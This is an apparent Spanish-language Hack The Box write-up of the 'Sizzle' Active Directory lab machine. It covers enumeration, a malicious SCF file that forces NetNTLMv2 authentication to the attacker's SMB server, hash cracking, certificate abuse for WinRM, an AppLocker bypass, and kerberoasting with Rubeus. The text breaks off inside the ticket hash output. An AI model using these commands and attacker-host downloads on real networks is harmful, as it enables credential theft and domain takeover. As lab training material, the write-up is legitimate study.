---
layout: post
title: Sizzle
date: 2023-01-20
description: 
img:
fig-caption:
tags: [OSCP, OSEP]
---
___

<center><img src="/writeups/assets/img/Sizzle-htb/Sizzle_banner.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración del SMB

* Fichero SCF Malicioso (Para obtener un hash NetNTLMv2)

* Enumeración del Ldap

* Abuso del Servicio de Creación de Certificados del Directorio Activo

* Creación de certificados

* AppLocker Bypass

* Kerberoasting Attack

* Enumeración con BloodHound

* DCSync Attack

* PassTheHash

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS -vvv 10.10.10.103 -oG open_ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-20 12:38 GMT
Initiating SYN Stealth Scan at 12:38
Scanning 10.10.10.103 [65535 ports]
Discovered open port 443/tcp on 10.10.10.103
Discovered open port 80/tcp on 10.10.10.103
Discovered open port 53/tcp on 10.10.10.103
Discovered open port 139/tcp on 10.10.10.103
Discovered open port 135/tcp on 10.10.10.103
Discovered open port 445/tcp on 10.10.10.103
Discovered open port 21/tcp on 10.10.10.103
Discovered open port 49689/tcp on 10.10.10.103
Discovered open port 3269/tcp on 10.10.10.103
Discovered open port 49669/tcp on 10.10.10.103
Discovered open port 49664/tcp on 10.10.10.103
Discovered open port 49694/tcp on 10.10.10.103
Discovered open port 464/tcp on 10.10.10.103
Discovered open port 49675/tcp on 10.10.10.103
Discovered open port 49687/tcp on 10.10.10.103
Discovered open port 49667/tcp on 10.10.10.103
Discovered open port 49691/tcp on 10.10.10.103
Discovered open port 636/tcp on 10.10.10.103
Discovered open port 593/tcp on 10.10.10.103
Discovered open port 49700/tcp on 10.10.10.103
Discovered open port 389/tcp on 10.10.10.103
Discovered open port 52928/tcp on 10.10.10.103
Discovered open port 49665/tcp on 10.10.10.103
Discovered open port 5985/tcp on 10.10.10.103
Discovered open port 5986/tcp on 10.10.10.103
Discovered open port 47001/tcp on 10.10.10.103
Discovered open port 3268/tcp on 10.10.10.103
Discovered open port 9389/tcp on 10.10.10.103
Discovered open port 49712/tcp on 10.10.10.103
Completed SYN Stealth Scan at 12:38, 27.05s elapsed (65535 total ports)
Nmap scan report for 10.10.10.103
Host is up, received user-set (0.13s latency).
Scanned at 2023-01-20 12:38:25 GMT for 27s
Not shown: 65506 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
21/tcp    open  ftp              syn-ack ttl 127
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
443/tcp   open  https            syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
5986/tcp  open  wsmans           syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49669/tcp open  unknown          syn-ack ttl 127
49675/tcp open  unknown          syn-ack ttl 127
49687/tcp open  unknown          syn-ack ttl 127
49689/tcp open  unknown          syn-ack ttl 127
49691/tcp open  unknown          syn-ack ttl 127
49694/tcp open  unknown          syn-ack ttl 127
49700/tcp open  unknown          syn-ack ttl 127
49712/tcp open  unknown          syn-ack ttl 127
52928/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.16 seconds
           Raw packets sent: 131051 (5.766MB) | Rcvd: 39 (1.716KB)
```

### Escaneo de Servicios y Versiones de cada puerto

```null
nmap -sCV -p21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986,9389,47001,49664,49665,49667,49669,49675,49687,49689,49691,49694,49700,49712,52928 10.10.10.103 -Pn -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-20 12:40 GMT
Nmap scan report for htb.local (10.10.10.103)
Host is up (0.17s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
|_ssl-date: 2023-01-20T12:42:02+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/10.0
|_ssl-date: 2023-01-20T12:42:02+00:00; 0s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap
|_ssl-date: 2023-01-20T12:42:02+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2023-01-20T12:42:02+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
|_ssl-date: 2023-01-20T12:42:02+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2023-01-20T12:42:02+00:00; 0s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2018-07-02T20:26:23
|_Not valid after:  2019-07-02T20:26:23
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
52928/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-01-20T12:41:21
|_  start_date: 2023-01-20T12:30:24

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 119.76 seconds
```

En base a los CN, añado el dominio htb.local y el subdominio sizzle.htb.local al /etc/hosts

```null
echo '10.10.10.103 htb.local sizzle.htb.local' >> /etc/hosts
```

Como el usuario anonymous está habilitado en el FTP, me conecto al servicio

## Puerto 21 (FTP)

```null
ftp 10.10.10.103
Connected to 10.10.10.103.
220 Microsoft FTP Service
Name (10.10.10.103:rubbx): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||52959|)
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> 
```

No hay nada que pueda enumerar así que lo dejo de lado

## Puerto 445 (SMB)

Con crackmapexec me conecto a la máquina víctima para identificar el dominio, hostname, y versiones

```null
crackmapexec smb 10.10.10.103
SMB         10.10.10.103    445    SIZZLE           [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)
```

El dominio lo tenía añadido de antes así que con smbmap enumero los recursos compartidos a nivel de red

```null
mbmap -H 10.10.10.103 -u 'null'
[+] Guest session   	IP: 10.10.10.103:445	Name: htb.local                                         
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	CertEnroll                                        	NO ACCESS	Active Directory Certificate Services share
	Department Shares                                 	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Operations                                        	NO ACCESS	
	SYSVOL                                            	NO ACCESS	Logon server share 
```

De todos ellos, destaca Department Shares, así que de forma recursiva enumero los subdirectorios

```null
smbmap -H 10.10.10.103 -u 'null' -r 'Department Shares'
[+] Guest session   	IP: 10.10.10.103:445	Name: htb.local                                         
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Department Shares                                 	READ ONLY	
	.\Department Shares\*
	dr--r--r--                0 Tue Jul  3 15:22:32 2018	.
	dr--r--r--                0 Tue Jul  3 15:22:32 2018	..
	dr--r--r--                0 Mon Jul  2 19:21:43 2018	Accounting
	dr--r--r--                0 Mon Jul  2 19:14:28 2018	Audit
	dr--r--r--                0 Tue Jul  3 15:22:39 2018	Banking
	dr--r--r--                0 Mon Jul  2 19:15:01 2018	CEO_protected
	dr--r--r--                0 Mon Jul  2 19:22:06 2018	Devops
	dr--r--r--                0 Mon Jul  2 19:11:57 2018	Finance
	dr--r--r--                0 Mon Jul  2 19:16:11 2018	HR
	dr--r--r--                0 Mon Jul  2 19:14:24 2018	Infosec
	dr--r--r--                0 Mon Jul  2 19:13:59 2018	Infrastructure
	dr--r--r--                0 Mon Jul  2 19:12:04 2018	IT
	dr--r--r--                0 Mon Jul  2 19:12:09 2018	Legal
	dr--r--r--                0 Mon Jul  2 19:15:25 2018	M&A
	dr--r--r--                0 Mon Jul  2 19:14:43 2018	Marketing
	dr--r--r--                0 Mon Jul  2 19:11:47 2018	R&D
	dr--r--r--                0 Mon Jul  2 19:14:37 2018	Sales
	dr--r--r--                0 Mon Jul  2 19:21:46 2018	Security
	dr--r--r--                0 Mon Jul  2 19:16:54 2018	Tax
	dr--r--r--                0 Tue Jul 10 21:39:32 2018	Users
	dr--r--r--                0 Mon Jul  2 19:32:58 2018	ZZ_ARCHIVE

```

Uno de ellos es de usuarios

```null
mbmap -H 10.10.10.103 -u 'null' -r 'Department Shares/Users'
[+] Guest session   	IP: 10.10.10.103:445	Name: htb.local                                         
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Department Shares                                 	READ ONLY	
	.\Department SharesUsers\*
	dr--r--r--                0 Tue Jul 10 21:39:32 2018	.
	dr--r--r--                0 Tue Jul 10 21:39:32 2018	..
	dr--r--r--                0 Mon Jul  2 19:18:43 2018	amanda
	dr--r--r--                0 Mon Jul  2 19:19:06 2018	amanda_adm
	dr--r--r--                0 Mon Jul  2 19:18:28 2018	bill
	dr--r--r--                0 Mon Jul  2 19:18:31 2018	bob
	dr--r--r--                0 Mon Jul  2 19:19:14 2018	chris
	dr--r--r--                0 Mon Jul  2 19:18:39 2018	henry
	dr--r--r--                0 Mon Jul  2 19:18:34 2018	joe
	dr--r--r--                0 Mon Jul  2 19:18:53 2018	jose
	dr--r--r--                0 Tue Jul 10 21:39:32 2018	lkys37en
	dr--r--r--                0 Mon Jul  2 19:18:48 2018	morgan
	dr--r--r--                0 Mon Jul  2 19:19:20 2018	mrb3n
	dr--r--r--                0 Wed Sep 26 05:45:32 2018	Public
```

Ahora me puedo montar un diccionario, pero no puedo validar si son válidos ya que el Kerberos no está abierto externamente

Con smbcacls, busco por directorios los cuales tenga permiso de escritura

```null
for i in $(cat users); do echo -e "\nDirectorio $i"; smbcacls "//10.10.10.103/Department Shares" Users/$i -N | grep Everyone; done

Directorio amanda
ACL:Everyone:ALLOWED/OI|CI|I/READ

Directorio amanda_adm
ACL:Everyone:ALLOWED/OI|CI|I/READ

Directorio bill
ACL:Everyone:ALLOWED/OI|CI|I/READ

Directorio bob
ACL:Everyone:ALLOWED/OI|CI|I/READ

Directorio chris
ACL:Everyone:ALLOWED/OI|CI|I/READ

Directorio henry
ACL:Everyone:ALLOWED/OI|CI|I/READ

Directorio joe
ACL:Everyone:ALLOWED/OI|CI|I/READ

Directorio jose
ACL:Everyone:ALLOWED/OI|CI|I/READ

Directorio lkys37en
ACL:Everyone:ALLOWED/OI|CI|I/READ

Directorio morgan
ACL:Everyone:ALLOWED/OI|CI|I/READ

Directorio mrb3n
ACL:Everyone:ALLOWED/OI|CI|I/READ

Directorio Public
ACL:Everyone:ALLOWED/OI|CI/FULL
ACL:Everyone:ALLOWED/OI|CI|I/READ
```

En Public, tengo todos los permisos, así que podría subir un archivo SCF malicioso que trate de cargar un recurso compartido a nivel de red que esté alojado de mi lado, de tal manera que al haber una autenticación pueda ver un hash NetNTLMv2 que puede tratar de crackear para obtener una contraseña.

Este fichero tiene la siguiente estructura

```null
cat malicious.scf
[Shell]
Command=2
IconFile=\\10.10.16.6\shared\pwned.ico
[Taskbar]
Command=ToggleDesktop

```

Creo una montura para subir el archivo

```null
mkdir /mnt/Sizzle
mount -t cifs "//10.10.10.103/Department Shares/Users" /mnt/Sizzle
cd /mnt/Sizzle/Users/Public
```

Con impacket-smbserver creo el recurso compartido y obtengo el hash

```null
smbserver.py shared $(pwd) -smb2support
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.103,57905)
[*] AUTHENTICATE_MESSAGE (HTB\amanda,SIZZLE)
[*] User SIZZLE\amanda authenticated successfully
[*] amanda::HTB:aaaaaaaaaaaaaaaa:58bb29cde621cff6c8912c3aa8b0464f:010100000000000080229ccbcf2cd901f67e9394b1ed25b6000000000100100047007a004a00440065007000770067000300100047007a004a0044006500700077006700020010005200500058004d005a00780068006100040010005200500058004d005a007800680061000700080080229ccbcf2cd90106000400020000000800300030000000000000000100000000200000138b99707d23fb5783ca3fc2058fc93fed24cddeef9c98313b4a2c4211f17df10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003600000000000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:shared)
[*] Disconnecting Share(2:shared)
```

Lo almaceno en un fichero temporal para crackearlo y obtengo una contraseña

```null
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ashare1972       (amanda)     
1g 0:00:00:04 DONE (2023-01-20 13:06) 0.2028g/s 2315Kp/s 2315Kc/s 2315KC/s Ashiah08..Ariel!
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

Creo un archivo de credenciales

```null
echo 'amanda:Ashare1972' > credentials.txt
```

Valido si son válidas por SMB

```null
crackmapexec smb 10.10.10.103 -u 'amanda' -p 'Ashare1972'
SMB         10.10.10.103    445    SIZZLE           [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.103    445    SIZZLE           [+] HTB.LOCAL\amanda:Ashare1972 
```

Son válidas, pero no tengo privilegios para obtener una consola interactiva

En caso de que por winrm se autentique podría ganar acceso

```null
crackmapexec winrm 10.10.10.103 -u 'amanda' -p 'Ashare1972'
SMB         10.10.10.103    5986   SIZZLE           [*] Windows 10.0 Build 14393 (name:SIZZLE) (domain:HTB.LOCAL)
HTTP        10.10.10.103    5986   SIZZLE           [*] https://10.10.10.103:5986/wsman
WINRM       10.10.10.103    5986   SIZZLE           [-] HTB.LOCAL\amanda:Ashare1972 "The server did not response with one of the following authentication methods Negotiate, Kerberos, NTLM - actual: ''"
```

Da un error así que en principio no se puede

## Puerto 389 (LDAP)

Creo un directorio donde guardar datos que obtendré al autenticarme al ldap

```null
mkdir ld
cd !$
```

Con ldapdomaindump dumpeo los datos

```null
ldapdomaindump -u 'htb.local\amanda' -p 'Ashare1972' 10.10.10.103
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

Monto un servicio http para desde el navegador ver el reporte de forma gráfica

```null
python3 -m http.server 80
```

Entre toda la información destaca la siguiente:

<img src="/writeups/assets/img/Sizzle-htb/1.png" alt="">

El usuario amanda pertenece al grupo Remote Management Users, por lo que me debería poder conectar al winrm, sin embargo crackmapexec había reportado un error.

Volviendo a los puertos abiertos, lo estaba el 5986, que es por SSL

Por ello, necesitaría crear una clave privada y obtener una pública descargándola de algún servicio que esté expuesto. Es común encontrar Microsoft Active Directory Certificate Services vía web

## Puerto 80 (HTTP)

En la página principal aparece lo siguiente

<img src="/writeups/assets/img/Sizzle-htb/2.png" alt="">

Es el momento de aplicar fuzzing. Como es un IIS, utilizaré un diccionario específico para el mismo

<img src="/writeups/assets/img/Sizzle-htb/3.png" alt="">

```null
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/IIS.fuzz.txt http://10.10.10.103/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.103/FUZZ
Total requests: 210

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000021:   403        29 L     92 W       1233 Ch     "/aspnet_client/"                                                                                                                               
000000030:   401        29 L     100 W      1293 Ch     "/certsrv/"                                                                                                                                     
000000032:   401        29 L     100 W      1293 Ch     "/certsrv/mscep/mscep.dll"                                                                                                                      
000000029:   403        29 L     92 W       1233 Ch     "/certenroll/"                                                                                                                                  
000000031:   401        29 L     100 W      1293 Ch     "/certsrv/mscep_admin"                                                                                                                          
000000128:   400        6 L      26 W       324 Ch      "/<script>alert('XSS')</script>.aspx"                                                                                                           
000000127:   400        6 L      26 W       324 Ch      "/~/<script>alert('XSS')</script>.aspx"                                                                                                         
000000126:   400        6 L      26 W       324 Ch      "/~/<script>alert('XSS')</script>.asp"                                                                                                          
000000107:   400        6 L      26 W       324 Ch      "/%NETHOOD%/"                                                                                                                                   
000000083:   403        29 L     92 W       1233 Ch     "/images/"                                                                                                                                      

Total time: 0
Processed Requests: 210
Filtered Requests: 200
Requests/sec.: 0
```

Introduciendo la ruta /certsrv pide una autenticación, la cual como está el Directorio Activo montado por detrás quiero pensar que me sirven las credenciales del usuario amanda

<img src="/writeups/assets/img/Sizzle-htb/4.png" alt="">

Ahora puedo generar la clave pública que me hacía falta para conectarme al winrm

<img src="/writeups/assets/img/Sizzle-htb/5.png" alt="">

Para solicitar la clave, me pide un Certificate Signing Request

<img src="/writeups/assets/img/Sizzle-htb/6.png" alt="">

Puedo crearlo con openssl

```null
openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr

You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:

```

Copio el csr y se lo proporciono al servicio

<img src="/writeups/assets/img/Sizzle-htb/7.png" alt="">

Descargo la clave pública y con evil-winrm me conecto a la máquina

<img src="/writeups/assets/img/Sizzle-htb/8.png" alt="">

Finalmente gano acceso al sistema

```null
evil-winrm -S -c amanda.cer -k amanda.key -i 10.10.10.103 -u 'amanda' -p 'Ashare1972'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\amanda\Documents> 
```

Para encontrar la forma más rápida de escalar privilegios, utilizo bloodhound

Para ello hay que subir un injestor a la máquina víctima y ejecutarlo, para que cree un zip que subiré al bloodhound

```null
*Evil-WinRM* PS C:\Users\amanda\Documents> iwr -uri http://10.10.16.6/SharpHound.exe -o SharpHound.exe
*Evil-WinRM* PS C:\Users\amanda\Documents> .\SharpHound.exe
Program 'SharpHound.exe' failed to run: This program is blocked by group policy. For more information, contact your system administratorAt line:1 char:1
+ .\SharpHound.exe
+ ~~~~~~~~~~~~~~~~.
At line:1 char:1
+ .\SharpHound.exe
+ ~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```

El defender lo bloquea. Para burlarlo, me dirijo a una ruta del [AppLocker Bypass](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md) y opero desde allí

```null
*Evil-WinRM* PS C:\Users\amanda\Documents> cd C:\Windows\System32\spool\drivers\color
*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> iwr -uri http://10.10.16.6/SharpHound.exe -o SharHound.exe
*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> iwr -uri http://10.10.16.6/SharpHound.exe -o SharpHound.exe
*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> .\SharpHound.exe
2023-01-20T08:49:17.3497572-05:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-01-20T08:49:17.3654172-05:00|INFORMATION|Initializing SharpHound at 8:49 AM on 1/20/2023
2023-01-20T08:49:17.6153871-05:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-01-20T08:49:17.8653866-05:00|INFORMATION|Beginning LDAP search for HTB.LOCAL
2023-01-20T08:49:17.9122597-05:00|INFORMATION|Producer has finished, closing LDAP channel
2023-01-20T08:49:17.9122597-05:00|INFORMATION|LDAP channel closed, waiting for consumers
2023-01-20T08:49:48.4435998-05:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM
2023-01-20T08:50:01.2873810-05:00|INFORMATION|Consumers finished, closing output channel
2023-01-20T08:50:01.3342254-05:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2023-01-20T08:50:01.7092499-05:00|INFORMATION|Status: 94 objects finished (+94 2.186047)/s -- Using 55 MB RAM
2023-01-20T08:50:01.7092499-05:00|INFORMATION|Enumeration finished in 00:00:43.8519372
2023-01-20T08:50:01.8967519-05:00|INFORMATION|SharpHound Enumeration Completed at 8:50 AM on 1/20/2023! Happy Graphing!
```

Con impacket-smbserver transfiero el zip del SharpHound a mi equipo

```null
smbserver.py shared $(pwd) -smb2support
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Desde la máquina víctima copio el recurso

```null
*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> copy .\20230120085001_BloodHound.zip \\10.10.16.6\Shared\bh.zip
```

Ejecuto neo4j y bloodhound

```null
neo4j console
```

Una vez subidos los datos, se puede ver que el usuario mrlky es kerberoasteable

<img src="/writeups/assets/img/Sizzle-htb/9.png" alt="">

Además, ese usuario tiene capacidad de DCSync sobre el dominio htb.local

<img src="/writeups/assets/img/Sizzle-htb/10.png" alt="">


El vector de ataque sería consiguir el TGS de mrlky, crackearlo, obtener su contraseña, y dumpear todos los hashes NT del dominio

Con Rubeus, aplico el kerberoasting attack, ya que el puerto 88 solo está abierto internamente

```null
*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> iwr -uri http://10.10.16.6/Rubeus.exe -o Rubeus.exe
*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> .\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : HTB.LOCAL
[*] Searching path 'LDAP://sizzle.HTB.LOCAL/DC=HTB,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : mrlky
[*] DistinguishedName      : CN=mrlky,CN=Users,DC=HTB,DC=LOCAL
[*] ServicePrincipalName   : http/sizzle
[*] PwdLastSet             : 7/10/2018 2:08:09 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle@HTB.LOCAL*$46942998ACECC61F85DF0D44E6DB
                             FBB8$E3F2F615F33DF2F9F06ADD37A8A249B052980073527353B8A7CB98B40C4615FBDC4A3854BAB
                             682BA0607C8D1B239E41D53C2C29317343183AF26A2165F06DFFB7B5CC293B73AED9E34F725E2EC5
                             EDD3852812EF12A6E47386DC3AA20A7685519670D44308E9CA47D27411668E9EDDE7625E1B333DD9
                             3653F974C18FD51BB9D8B76D53C814BB4266E7686B5D4AA10A8B3F0116D335DF1EDCE4EB49CC4FBC
                             B5CB6B79DECD4CF5CC67BB98340B642F1BD7450269F874093F17C60DE0A741F6F112E565FD3A615E
                             3EDFC42E58C8454F7CE6E7C9B6415011A70BB378D5FD2A060B5435F11F0444DA63E963C3DF92EFE3
                             4456C968EB9FDF747A3E262F7472551C2825F3730F860F5396E46C71A2CA980624B5122561EE008C
                             C5B0CCC7D12367EF4FB982B8836DC3B51A395E3B81997E0D7DF3DA5AEC4E873BE0F5C157B8D19B30
                             C2B9DDCE93771BF8A70F3570DCB6CE8FD941AB2DA741B8B92C8210AD7704941CC1E085BFEA54196C
                             47B3D251270FBB42CDC13A11CDEEBE473F00355CEF337E72B6ABD9C8197083EA2E19482FEF6EA9DD
                             80586A8F28C68CEC0822A9112B2DD5342918C8B0F8E638C76BD0FF4357B6E951A544D60D617F606F
                             434698D13B3BC0468B436078ACA89E4592C5B20BE9E63DACD25C0DE3D1C141AE3B93BE6D89E66A3E
                             0C376A3B24814EA53B3FD570EA3E8A43845D4CBAFC8F63D8F2F14B5C280F4E7CE20EBDCA7ECE6DAB
                             D9310B10F5B3ADDD80B31A1746AB91F35776D40DF01A143757E3F459A10EDE11869296C9893FB3D9
                             80B10FA937EAAA33CD1E819CA08007C3C49650E7FCCC20115F6150AB3AEC875FC1B58427C1F7C630
                             F2B1D37CCB9C04EC25CD18236EB07C78DCFA52AC4353DFF7C622576DE19134E7A34FF9ADBC16D209
                             B50CC1D417E2889FAC37B40CA66A5E9CD326020CFB5BCD574A97511359A284E5856D7AA80F135786
                             E57A243C5B7ED853EDF158157FF25F77124EA36F8E6D09FBE316A8FCD569CB0FEBEA67F0EB239C51
